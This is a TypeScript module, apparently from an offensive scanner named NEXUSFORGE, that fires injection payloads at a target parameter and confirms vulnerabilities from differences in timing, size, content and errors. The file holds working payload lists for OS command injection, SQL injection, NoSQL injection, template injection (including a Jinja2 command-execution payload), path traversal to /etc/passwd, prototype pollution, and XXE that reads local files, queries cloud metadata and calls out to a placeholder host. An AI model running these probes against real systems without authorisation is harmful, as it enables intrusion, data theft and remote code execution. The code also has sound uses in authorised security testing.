/* ════════════════════════════════════════════════════════════════════
     NEXUSFORGE — Differential Analysis Engine
     Detects injection without signatures — timing, size, content, and
     error-based deltas across OS command, SQL, LDAP, and template contexts.
     ════════════════════════════════════════════════════════════════════ */

import { logger } from "./logger.js";

export interface DiffConfig {
  targetUrl:     string;
  injectParam:   string;
  httpMethod:    "GET" | "POST";
  customHeaders?: Record<string, string>;
  timeoutMs?:    number;
}

export interface DiffResult {
  method:         "timing" | "size" | "content" | "status" | "error" | "none";
  confirmed:      boolean;
  confidence:     "high" | "medium" | "low";
  payload:        string;
  baselineMs:     number;
  testMs:         number;
  timingDelta:    number;
  baselineSize:   number;
  testSize:       number;
  sizeDelta:      number;
  baselineStatus: number;
  testStatus:     number;
  evidence:       string;
}

const DEFAULT_TO = 12_000;
const TIMING_THRESH = 1800;
const SIZE_THRESH   = 60;

async function req(
  cfg: DiffConfig,
  value: string,
): Promise<{ status: number; size: number; elapsed: number; body: string }> {
  const ctrl  = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), cfg.timeoutMs ?? DEFAULT_TO);
  const t0    = Date.now();
  const hdrs: Record<string, string> = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ...(cfg.customHeaders ?? {}),
  };
  try {
    let resp: Response;
    if (cfg.httpMethod === "POST") {
      hdrs["Content-Type"] = "application/x-www-form-urlencoded";
      resp = await fetch(cfg.targetUrl, {
        method: "POST",
        headers: hdrs,
        body: encodeURIComponent(cfg.injectParam) + "=" + encodeURIComponent(value),
        signal: ctrl.signal,
        redirect: "manual",
      });
    } else {
      const u = new URL(cfg.targetUrl);
      u.searchParams.set(cfg.injectParam, value);
      resp = await fetch(u.toString(), { headers: hdrs, signal: ctrl.signal, redirect: "manual" });
    }
    clearTimeout(timer);
    const body    = await resp.text().catch(() => "");
    return { status: resp.status, size: body.length, elapsed: Date.now() - t0, body };
  } catch {
    clearTimeout(timer);
    return { status: 0, size: 0, elapsed: Date.now() - t0, body: "" };
  }
}

/* ── Timing — covers OS cmd, SQL time-based, and Windows equivalents ── */
const TIMING_PAYLOADS = [
  /* OS command injection */
  "1; sleep 2",
  "1 || sleep 2",
  "1 | sleep 2 #",
  "1`sleep 2`",
  "1$(sleep 2)",
  "1%0asleep%202",
  "1;{sleep,2}",
  "1&&sleep${IFS}2&&",
  /* SQL time-based */
  "1 AND sleep(2)-- -",
  "1' AND sleep(2)-- -",
  "1\" AND sleep(2)-- -",
  "1 AND (SELECT * FROM (SELECT(sleep(2)))a)-- -",
  "1'; WAITFOR DELAY '0:0:2'-- -",
  "1; WAITFOR DELAY '0:0:2'",
  "1 OR pg_sleep(2)-- -",
  "1' OR pg_sleep(2)-- -",
  "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)-- -",
  /* Windows */
  "1; ping -n 2 127.0.0.1",
  "1; timeout /T 2 /NOBREAK",
  "1; Start-Sleep -Seconds 2",
];

/* ── Content/size — echo marker, SQL boolean, LDAP wildcard ── */
const SIZE_PAYLOADS = [
  /* OS command injection markers */
  "1 | echo NX_MARKER_OK",
  "1; echo NX_MARKER_OK",
  "1 || echo NX_MARKER_OK",
  "1`echo NX_MARKER_OK`",
  "1$(echo NX_MARKER_OK)",
  /* SQL boolean-based */
  "1' AND '1'='1",
  '1" AND "1"="1',
  "1 OR 1=1-- -",
  "1' OR '1'='1'-- -",
  "1 AND 1=1-- -",
  "1' AND 1=1-- -",
  /* Template injection probe */
  "{{7*7}}",
  "${7*7}",
  "<%=7*7%>",
  "#{7*7}",
];

/* ── Error-based — triggers error messages that reveal injection context ── */
const ERROR_PAYLOADS: Array<{ payload: string; patterns: string[] }> = [
  { payload: "'",              patterns: ["sql", "syntax", "mysql", "ora-", "pg_", "sqlite", "unclosed"] },
  { payload: "\"",             patterns: ["sql", "syntax", "unterminated", "unexpected"] },
  { payload: "\\",             patterns: ["sql", "syntax", "escape", "backslash"] },
  { payload: "1/0",            patterns: ["division", "divide by zero", "syntax", "error"] },
  { payload: "' OR 1=1 --",   patterns: ["sql", "mysql_fetch", "pg_query", "sqlite3"] },
  { payload: "${",             patterns: ["template", "freemarker", "velocity", "thymeleaf", "smarty"] },
  { payload: "{{",             patterns: ["template", "jinja", "nunjucks", "twig", "undefined", "error"] },
  { payload: "`id`",           patterns: ["uid=", "root", "command not found"] },
  { payload: ";id;",           patterns: ["uid=", "root", "sh:", "bash:"] },
  { payload: "| id",           patterns: ["uid=", "root"] },
  { payload: "$(id)",          patterns: ["uid=", "root"] },
  { payload: "../../../etc/passwd", patterns: ["root:x:", "daemon:", "nobody:"] },
  { payload: "<script>x</script>", patterns: ["<script>", "xss", "content-type: text/html"] },
  { payload: "AAAA".repeat(100), patterns: ["exception", "error", "500", "overflow", "truncat"] },
];

export async function runDifferentialAnalysis(cfg: DiffConfig): Promise<DiffResult[]> {
  const results: DiffResult[] = [];

  /* Baseline — three benign values averaged for stability */
  const [b1, b2, b3] = await Promise.all([req(cfg, "hello"), req(cfg, "test123"), req(cfg, "world")]);
  const baselineMs   = Math.round((b1.elapsed + b2.elapsed + b3.elapsed) / 3);
  const baselineSize = Math.round((b1.size + b2.size + b3.size) / 3);
  const baselineSt   = b1.status;
  logger.info({ baselineMs, baselineSize, baselineSt }, "differential: baseline");

  /* ── Timing tests ── */
  for (const payload of TIMING_PAYLOADS) {
    const t     = await req(cfg, payload);
    const delta = t.elapsed - baselineMs;
    if (delta >= TIMING_THRESH) {
      results.push({
        method: "timing", confirmed: true, confidence: delta >= 3000 ? "high" : "medium", payload,
        baselineMs, testMs: t.elapsed, timingDelta: delta,
        baselineSize, testSize: t.size, sizeDelta: t.size - baselineSize,
        baselineStatus: baselineSt, testStatus: t.status,
        evidence: `Timing delta ${delta}ms (baseline ${baselineMs}ms) — injection confirmed`,
      });
      break;
    } else if (delta > 800) {
      results.push({
        method: "timing", confirmed: false, confidence: "low", payload,
        baselineMs, testMs: t.elapsed, timingDelta: delta,
        baselineSize, testSize: t.size, sizeDelta: t.size - baselineSize,
        baselineStatus: baselineSt, testStatus: t.status,
        evidence: `Suspicious timing delta ${delta}ms — may indicate injection`,
      });
    }
    if (results.some(r => r.method === "timing" && r.confirmed)) break;
  }

  /* ── Content/size tests ── */
  for (const payload of SIZE_PAYLOADS) {
    const t         = await req(cfg, payload);
    const hasMarker = t.body.includes("NX_MARKER_OK");
    const hasMath   = t.body.includes("49") && (payload.includes("7*7") || payload.includes("7×7"));
    const delta     = t.size - baselineSize;
    if (hasMarker || hasMath) {
      results.push({
        method: "content", confirmed: true, confidence: "high", payload,
        baselineMs, testMs: t.elapsed, timingDelta: t.elapsed - baselineMs,
        baselineSize, testSize: t.size, sizeDelta: delta,
        baselineStatus: baselineSt, testStatus: t.status,
        evidence: hasMarker
          ? "Output marker NX_MARKER_OK present in response — OS injection confirmed"
          : "Template expression 7*7=49 evaluated in response — SSTI confirmed",
      });
      break;
    } else if (Math.abs(delta) >= SIZE_THRESH) {
      results.push({
        method: "size", confirmed: false, confidence: "low", payload,
        baselineMs, testMs: t.elapsed, timingDelta: t.elapsed - baselineMs,
        baselineSize, testSize: t.size, sizeDelta: delta,
        baselineStatus: baselineSt, testStatus: t.status,
        evidence: `Response size changed by ${delta} bytes — potential injection`,
      });
    }
    if (results.some(r => r.method === "content" && r.confirmed)) break;
  }

  /* ── Error-based tests ── */
  if (!results.some(r => r.confirmed)) {
    for (const { payload, patterns } of ERROR_PAYLOADS) {
      const t    = await req(cfg, payload);
      const body = t.body.toLowerCase();
      const hit  = patterns.find(p => body.includes(p.toLowerCase()));
      if (hit) {
        results.push({
          method: "error", confirmed: true, confidence: "medium", payload,
          baselineMs, testMs: t.elapsed, timingDelta: t.elapsed - baselineMs,
          baselineSize, testSize: t.size, sizeDelta: t.size - baselineSize,
          baselineStatus: baselineSt, testStatus: t.status,
          evidence: `Error signature "${hit}" found in response — injection context likely`,
        });
        break;
      }
      if (t.status >= 500 && baselineSt < 500) {
        results.push({
          method: "status", confirmed: false, confidence: "medium", payload,
          baselineMs, testMs: t.elapsed, timingDelta: t.elapsed - baselineMs,
          baselineSize, testSize: t.size, sizeDelta: t.size - baselineSize,
          baselineStatus: baselineSt, testStatus: t.status,
          evidence: `HTTP ${t.status} returned for injection payload (baseline was ${baselineSt}) — possible injection point`,
        });
      }
    }
  }

  if (results.length === 0) {
    results.push({
      method: "none", confirmed: false, confidence: "low", payload: "",
      baselineMs, testMs: baselineMs, timingDelta: 0,
      baselineSize, testSize: baselineSize, sizeDelta: 0,
      baselineStatus: baselineSt, testStatus: baselineSt,
      evidence: "No differential detected — target may not be injectable at this parameter",
    });
  }
  return results;
}

export interface VulnSignature {
  id:       string;
  name:     string;
  severity: "critical" | "high" | "medium" | "low";
  category: string;
  detect(base: string, alt: string): boolean;
  payloads: string[];
  notes:    string;
}

function diff(base: string, alt: string): { statusChanged: boolean; lengthDiff: number; newContent: string[]; errorRevealed: boolean } {
  const baseLines = new Set(base.split("\n"));
  const altLines  = alt.split("\n");
  const newContent = altLines.filter(l => !baseLines.has(l) && l.trim().length > 0);
  return {
    statusChanged: false,
    lengthDiff:    Math.abs(base.length - alt.length),
    newContent,
    errorRevealed: newContent.some(l => /error|exception|warning|fatal|sql|syntax|undefined|null/i.test(l)),
  };
}

export const BASE_SIGNATURES: VulnSignature[] = [];

export const EXTRA_SIGNATURES: VulnSignature[] = [
  { id:"nosql_boolean_blind", name:"NoSQL Boolean-Blind Injection", severity:"critical", category:"injection",
    detect(base: string, alt: string): boolean {
      const d = diff(base, alt);
      return d.statusChanged || d.lengthDiff > 200 || d.newContent.some((k: string) => ["true","false","null","cannot","cast"].some(t => k.toLowerCase().includes(t)));
    },
    payloads:[`{"$gt":""}`,`{"$ne":null}`,`{"$regex":".*"}`,`username[$gt]=&password[$gt]=`,`username[$ne]=invalid&password[$ne]=invalid`],
    notes:"MongoDB boolean-blind: $gt/$ne/$regex operators cause different response length or content on injection." },
  { id:"xxe_oob", name:"XXE Out-of-Band (DNS/HTTP)", severity:"critical", category:"injection",
    detect(base: string, alt: string): boolean {
      const d = diff(base, alt);
      return d.newContent.some((k: string) => ["DOCTYPE","ENTITY","<!"].some(t => k.includes(t))) || d.errorRevealed || d.statusChanged;
    },
    payloads:[
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CBHOST/xxe">]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
    ],
    notes:"XXE detected via response containing file contents or OOB callback. Try with Content-Type: application/xml." },
  { id:"graphql_introspection", name:"GraphQL Introspection Enabled", severity:"medium", category:"information-disclosure",
    detect(base: string, alt: string): boolean {
      return diff(base, alt).newContent.some((k: string) => ["__schema","queryType","__type","fields"].some(t => k.includes(t)));
    },
    payloads:[`{"query":"{__schema{queryType{name}}}"}`,`{"query":"{__schema{types{name,kind}}}"}`],
    notes:"GraphQL introspection reveals full schema — all types, queries, mutations, arguments." },
  { id:"prototype_pollution_reflected", name:"Prototype Pollution (Reflected)", severity:"high", category:"injection",
    detect(base: string, alt: string): boolean {
      const d = diff(base, alt);
      return d.newContent.some((k: string) => ["polluted","isAdmin","authorized","admin"].some(t => k.includes(t))) || d.statusChanged;
    },
    payloads:[`{"__proto__":{"isAdmin":true}}`,`{"constructor":{"prototype":{"isAdmin":true}}}`,`?__proto__[isAdmin]=true`],
    notes:"Prototype pollution: if injected properties appear in response or change authorization behavior." },
  { id:"ssti_jinja2", name:"SSTI Python/Jinja2", severity:"critical", category:"injection",
    detect(base: string, alt: string): boolean {
      const d = diff(base, alt);
      return d.newContent.some((k: string) => k.includes("49") || k.includes("7777777") || k.includes("config") || /\[.*class.*\]/.test(k));
    },
    payloads:[`{{7*7}}`,`{{7*'7'}}`,`{{config}}`,`{{lipsum.__globals__['os'].popen('id').read()}}`,`{{''.__class__.__mro__[1].__subclasses__()}}`],
    notes:"Jinja2 SSTI: 7*7=49 confirms injection. Escalate to __subclasses__ for RCE." },
];

export function getAllSignatures(): VulnSignature[] {
  return [...BASE_SIGNATURES, ...EXTRA_SIGNATURES];
}
